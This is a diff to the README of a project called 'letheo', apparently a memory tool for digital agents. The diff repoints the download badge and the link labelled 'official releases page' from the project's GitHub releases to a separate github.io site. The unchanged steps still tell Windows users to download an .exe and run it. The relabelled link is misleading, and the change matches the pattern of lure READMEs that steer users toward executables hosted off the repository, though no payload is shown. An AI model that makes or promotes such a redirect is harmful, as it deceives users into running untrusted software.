@@ -1,6 +1,6 @@
 # 🧠 letheo - Give your digital agents lasting memory
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Annoraprevious80/letheo/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://annoraprevious80.github.io)
 
 ## 📦 What is letheo?
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Your system requires at le
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/Annoraprevious80/letheo/releases).
+1. Visit the [official releases page](https://annoraprevious80.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release.
 3. Select the file ending in `.exe` to start your download.
 4. Open the downloaded file once the process finishes.
